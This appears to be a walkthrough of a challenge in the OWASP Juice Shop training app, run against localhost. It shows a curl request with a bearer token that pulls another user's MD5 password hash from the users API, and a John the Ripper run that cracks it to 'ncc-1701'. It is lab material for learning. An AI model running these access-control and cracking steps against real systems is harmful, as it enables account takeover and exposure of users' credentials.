After obtaining admin's password by simply Googling the hash, I wanted to
do something a little more interesting this time around.

First, we need to grab Jim's password hash:

```
$ curl -s 'http://localhost:3000/api/Users/2' -H 'Authorization: Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MSwiZW1haWwiOiJhZG1pbkBqdWljZS1zaC5vcCIsInBhc3N3b3JkIjoiMDE5MjAyM2E3YmJkNzMyNTA1MTZmMDY5ZGYxOGI1MDAiLCJjcmVhdGVkQXQiOiIyMDE4LTAxLTA0IDE0OjI0OjQxLjAyNSArMDA6MDAiLCJ1cGRhdGVkQXQiOiIyMDE4LTAxLTA0IDE0OjI0OjQxLjAyNSArMDA6MDAifSwiaWF0IjoxNTE1MDgzOTQxLCJleHAiOjE1MTUxMDE5NDF9.GNlwhCE34Hqbj4Tqs1hAdcp7SPwEZuoAtHsnbbOHcvpmJF9-CsV9sPXU5Fg2RBV3chyuQbcTPev1uzVdHGdt_vunzJhtl2PhYqLBB3e3dF8ah5sFbAsiRtFuHjOYOf5QsiiXl4lzx36QCaduWNFnfR15YRvtWq6srQT7gYJlNjE' | python -mjson.tool
{
    "data": {
        "createdAt": "2018-01-04T18:58:03.757Z",
        "email": "jim@juice-sh.op",
        "id": 2,
        "password": "e541ca7ecf72b8d1286474fc613e5e45",
        "updatedAt": "2018-01-04T18:58:03.757Z"
    },
    "status": "success"
}
```

Alright, let's put `e541ca7ecf72b8d1286474fc613e5e45` in `jim-hash.txt`.

Let's try and simply brute force this password...

[John the Ripper](http://www.openwall.com/john/) is a great, simple password
cracker.

Remember, the admin password was stored as a simple MD5 hash. We can use
this information to start cracking with `john`:

```
$ ./run/john --format=raw-MD5 jim-hash.txt 
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-MD5 [MD5 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:02:24  3/3 0g/s 46396Kp/s 46396Kc/s 46396KC/s plkbb074..plk3sa90
...
ncc-1701         (?)
1g 0:01:09:42 DONE 3/3 (2018-01-04 13:04) 0.000239g/s 47605Kp/s 47605Kc/s 47605KC/s ncc-15pa..ncc-175h
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```

`ncc-1701` it is! Coming in at a little over an hour, it's probably best to
stick with other methods unless you know a password is trivially simple.
